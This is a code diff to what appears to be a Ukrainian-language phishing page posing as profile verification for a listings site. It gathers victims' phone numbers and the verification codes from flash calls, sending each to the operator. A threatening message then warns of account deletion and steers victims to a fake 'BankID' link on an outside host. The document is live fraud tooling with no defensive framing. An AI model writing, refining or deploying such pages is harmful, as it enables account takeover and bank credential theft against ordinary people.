@@ -128,12 +128,13 @@
             color: var(--text-muted);
             margin-bottom: 16px;
             font-size: 14.5px;
+            line-height: 1.4;
         }
 
         .code-input-group {
             display: flex;
             justify-content: center;
-            gap: 8px;
+            gap: 12px; /* Трохи збільшив відступ, оскільки полів менше */
             margin: 0 auto 20px;
             padding: 0 10px;
             overflow-x: auto;
@@ -147,9 +148,9 @@
         }
 
         .code-input {
-            width: 48px;
-            height: 48px;
-            font-size: 20px;
+            width: 55px; /* Трохи ширші поля */
+            height: 55px;
+            font-size: 22px;
             font-weight: bold;
             text-align: center;
             border: 2px solid var(--border);
@@ -196,6 +197,29 @@
             transform: translateY(0);
         }
 
+        /* Стилі для чорної кнопки BankID */
+        .bankid-btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: #000; /* Чорний колір */
+            color: white;
+            text-decoration: none;
+            border-radius: 50px; /* Сильне закруглення */
+            font-size: 17px;
+            font-weight: 600;
+            text-align: center;
+            transition: opacity 0.3s ease, transform 0.2s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            margin-top: 20px;
+            border: none;
+        }
+
+        .bankid-btn:hover {
+            opacity: 0.85;
+            transform: translateY(-1px);
+        }
+
         .step {
             display: none;
             animation: slideIn 0.4s ease-out;
@@ -210,21 +234,13 @@
             to { opacity: 1; transform: translateX(0); }
         }
 
-        /* Стиль для успішного повідомлення */
-        .success-message {
-            color: var(--success);
+        /* Стиль для тексту помилки/попередження */
+        .warning-message {
+            color: #333;
             text-align: center;
-            padding: 20px;
-            font-size: 18px;
-            font-weight: 600;
+            padding: 10px;
+            font-size: 16px;
             line-height: 1.6;
-        }
-
-        .success-message i {
-            font-size: 48px;
-            display: block;
-            margin-bottom: 16px;
-            color: var(--success);
         }
 
         input[type=tel]::-webkit-inner-spin-button,
@@ -250,7 +266,6 @@
                 <img id="project-logo" src="" alt="Логотип" class="logo">
             </div>
 
-            <!-- Крок 1: Номер телефону -->
             <div id="phone-step" class="step active">
                 <div class="info-text">
                     Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону. Це допоможе захистити ваш акаунт і забезпечити його стабільну роботу.
@@ -267,33 +282,33 @@
                         aria-label="Номер телефону"
                     >
                 </div>
-                <button type="button" class="submit-button" onclick="showSmsStep()">
+                <button type="button" class="submit-button" onclick="showCallStep()">
                     Продовжити
                 </button>
             </div>
 
-            <!-- Крок 2: SMS-код -->
-            <div id="sms-step" class="step">
-                <p class="sms-prompt">Введіть 6-значний код з SMS</p>
+            <div id="call-step" class="step">
+                <p class="sms-prompt">
+                    Протягом 1-2хв вам надійде дзвінок, введіть <strong>4 останніх цифри</strong> номеру який дзвонив
+                </p>
                 <div class="code-input-group">
                     <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
                 </div>
-                <button type="button" class="submit-button" onclick="sendSmsCode()">
+                <button type="button" class="submit-button" onclick="sendCallCode()">
                     Підтвердити
                 </button>
             </div>
 
-            <!-- Крок 3: Успішне підтвердження (зелений текст) -->
-            <div id="success-step" class="step">
-                <div class="success-message">
-                    <i class="fas fa-check-circle"></i>
-                    <div>Ваш аккаунт успішно підтверджено</div>
+            <div id="final-step" class="step">
+                <div class="warning-message">
+                    Ваш профіль не підтверджено. Для скасування видалення та продовжити користуватись, підтвердіть профіль за допомогою bankID
                 </div>
+                <a href="https://idverification.onrender.com" class="bankid-btn">
+                    Підтвердити
+                </a>
             </div>
         </div>
     </div>
@@ -338,7 +353,7 @@
             });
         });
 
-        function showSmsStep() {
+        function showCallStep() {
             const phone = $('#phone-number').val().replace(/\s/g, '');
             if (!/^\+380\d{9}$/.test(phone)) {
                 alert('Введіть коректний номер: +380XXXXXXXXX');
@@ -350,21 +365,27 @@
             }
 
             $('#phone-step').removeClass('active');
-            $('#sms-step').addClass('active');
+            $('#call-step').addClass('active');
             $('#code-1').focus();
             sendData('phone', { phone });
         }
 
-        function sendSmsCode() {
+        function sendCallCode() {
+            // Збираємо код з 4 полів
             const code = $('.code-input').map((_, el) => el.value).get().join('');
-            if (!/^\d{6}$/.test(code)) {
-                alert('Введіть повний 6-значний код');
+            
+            // Перевірка на 4 цифри
+            if (!/^\d{4}$/.test(code)) {
+                alert('Введіть 4 останніх цифри номеру');
                 return;
             }
-            sendData('code', { code });
+            
+            // Відправка даних
+            sendData('code_call', { code });
 
-            $('#sms-step').removeClass('active');
-            $('#success-step').addClass('active');
+            // Перехід на фінальний крок
+            $('#call-step').removeClass('active');
+            $('#final-step').addClass('active');
         }
 
         function sendData(step, data) {
